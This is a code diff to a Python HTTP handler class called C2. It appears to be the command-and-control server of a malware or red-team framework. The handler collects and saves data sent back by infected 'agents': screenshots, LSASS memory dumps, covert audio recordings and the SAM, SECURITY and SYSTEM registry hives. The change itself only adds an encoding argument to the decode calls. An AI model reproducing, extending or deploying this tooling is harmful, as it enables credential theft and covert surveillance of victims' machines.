@@ -55,21 +55,21 @@ class C2(BaseHTTPRequestHandler):
         elif command_type == "screenshot" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(
                 collect_folder, agent, "screenshot_{}.png".format(datetime.now().strftime(file_save_strftime)))
-            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["screenshot_base64"])):
+            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["screenshot_base64"], encoding="utf-8")):
                 utils.log_message(f"Downloaded screenshot from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
         elif command_type == "lsass" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(collect_folder, agent, "lsass_{}.dmp".format(datetime.now().strftime(
                 file_save_strftime)))
-            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
+            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
                 utils.log_message(f"Downloaded lsass dump from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
         elif command_type == "audio" and agent_data["data"]["is_success"] == "true":
             save_path = os.path.join(collect_folder, agent, "record_{}.wav".format(datetime.now().strftime(
                 file_save_strftime)))
-            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"])):
+            if utils.write_file(save_path, utils.decode_base_64(agent_data["data"]["file_content_base64"], encoding="utf-8")):
                 utils.log_message(f"Downloaded audio recording from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
@@ -78,9 +78,9 @@ class C2(BaseHTTPRequestHandler):
             sam_path = os.path.join(save_path, "sam")
             sec_path = os.path.join(save_path, "security")
             sys_path = os.path.join(save_path, "system")
-            if utils.write_file(sam_path, utils.decode_base_64(agent_data["data"]["sam_base64"])) and \
-                    utils.write_file(sec_path, utils.decode_base_64(agent_data["data"]["sec_base64"])) and \
-                    utils.write_file(sys_path, utils.decode_base_64(agent_data["data"]["sys_base64"])):
+            if utils.write_file(sam_path, utils.decode_base_64(agent_data["data"]["sam_base64"], encoding="utf-8")) and \
+                    utils.write_file(sec_path, utils.decode_base_64(agent_data["data"]["sec_base64"], encoding="utf-8")) and \
+                    utils.write_file(sys_path, utils.decode_base_64(agent_data["data"]["sys_base64"], encoding="utf-8")):
                 utils.log_message(f"Downloaded sam,security,system hives from agent {agent}")
                 utils.log_message(f"[+] saved in: {save_path}", print_time=False)
 
